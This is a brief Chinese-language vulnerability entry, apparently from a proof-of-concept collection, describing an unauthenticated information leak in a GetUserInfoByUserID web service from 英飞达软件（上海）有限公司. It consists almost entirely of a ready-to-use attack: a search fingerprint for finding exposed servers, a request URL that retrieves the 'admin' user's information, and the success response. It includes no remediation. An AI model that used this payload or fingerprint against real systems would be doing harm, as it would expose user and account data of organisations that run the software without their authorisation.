# 英飞达软件（上海）有限公司GetUserInfoByUserID存在信息泄露漏洞

英飞达软件（上海）有限公司 ｜ 信息泄露 ｜ —
- **指纹**：`body="./scripts/library/bluebird.min.js"`

**Payload**
```
/webservices/WebUserLogin.asmx/GetUserInfoByUserID?userID=admin
```
- **响应特征**：200